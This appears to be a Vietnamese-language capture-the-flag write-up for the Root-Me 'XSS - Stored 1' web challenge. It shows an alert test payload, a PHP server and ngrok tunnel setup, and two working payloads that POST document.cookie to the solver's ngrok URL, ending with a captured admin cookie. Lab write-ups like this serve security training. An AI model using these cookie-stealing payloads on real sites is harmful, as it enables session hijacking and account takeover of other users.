# [XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)

## Solutions

- Thử post message với nội dung:

```js
<script>alert(document.domain)</script>
```

=> load lại trang có xuất hiện alert => có lỗ hổng xss stored

- Post một script để người dùng khác hoặc admin gửi cookie đến mình:
  - Tạo một server ở localhost: `php -S localhost:8080`
  - Sử dụng ngrok để tạo một public url có chuyển hướng đến localhost:8080: `ngrok http 8080`
  - post javascript:

    ```js
    <script>fetch('https://0319-58-187-92-48.ap.ngrok.io', {method: 'POST', mode: 'no-cors', body: document.cookie})</script>
    ```

    ```js
    <img src=1 onerror="fetch('https://0319-58-187-92-48.ap.ngrok.io', {method: 'POST', mode: 'no-cors', body: document.cookie})">
    ```

- Đợi một lúc sẽ thấy request ở trang `http://127.0.0.1:4040/inspect/http` với body: `ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6`

## References

- <https://www.ilovefreesoftware.com/30/featured/free-tools-to-expose-localhost-to-internet.html>
- <https://portswigger.net/web-security/cross-site-scripting>
